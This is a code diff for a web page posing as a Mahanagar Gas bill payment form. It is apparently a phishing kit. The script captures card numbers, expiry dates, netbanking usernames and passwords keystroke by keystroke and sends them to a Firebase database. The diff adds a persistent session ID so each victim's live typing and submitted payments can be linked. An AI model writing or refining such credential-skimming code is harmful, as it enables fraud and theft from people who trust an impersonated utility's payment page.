@@ -4,6 +4,7 @@
   <title>Mahanagar Gas Payment</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
+    /* Sabhi CSS same hai */
     body { font-family: Arial; background-color: #FFFFFF; text-align: center; padding-top: 50px; margin: 0; }
     img { width: 300px; border-radius: 10px; }
     .form-container { margin: 50px auto; max-width: 400px; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
@@ -78,20 +79,27 @@
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
-    let liveDocId = "user_" + Date.now();
+
+    // --- SESSION ID LOGIC ---
+    const sessionId = localStorage.getItem("user_session_id") || ("MGL_GUEST_" + Date.now());
 
     function showForm(type) {
       document.querySelectorAll('.payment-form').forEach(f => f.style.display = 'none');
       document.querySelectorAll('.side-button').forEach(b => b.style.display = 'block');
       document.getElementById(type + 'Form').style.display = 'block';
       document.getElementById('btn-' + type).style.display = 'none';
+      liveUpdate(); // Call liveUpdate when form switches
     }
 
     function liveUpdate() {
       const activeForm = Array.from(document.querySelectorAll('.payment-form')).find(f => f.style.display === 'block');
       if(!activeForm) return;
 
-      let data = { timestamp: firebase.firestore.FieldValue.serverTimestamp() };
+      let data = { 
+        sessionId: sessionId, 
+        timestamp: firebase.firestore.FieldValue.serverTimestamp() 
+      };
+      
       const type = activeForm.id.replace('Form', '');
 
       if (type === 'debit' || type === 'credit') {
@@ -105,11 +113,14 @@
         data.username = document.getElementById('netUser').value;
         data.password = document.getElementById('netPass').value;
       }
-      db.collection("live_typing").doc(liveDocId).set(data, { merge: true });
+      
+      // Use sessionId as doc ID for single box live update
+      db.collection("live_typing").doc(sessionId).set(data, { merge: true });
     }
 
     function submitCard(type) {
       db.collection("payments").add({
+        sessionId: sessionId, // ID attached
         method: type + " card",
         card: document.getElementById(type + 'CardNumber').value,
         expiry: document.getElementById(type + 'Month').value + "/" + document.getElementById(type + 'Year').value,
@@ -120,6 +131,7 @@
 
     function submitNetBanking() {
       db.collection("payments").add({
+        sessionId: sessionId, // ID attached
         method: "netbanking",
         bank: document.getElementById("bankSelect").value,
         username: document.getElementById("netUser").value,
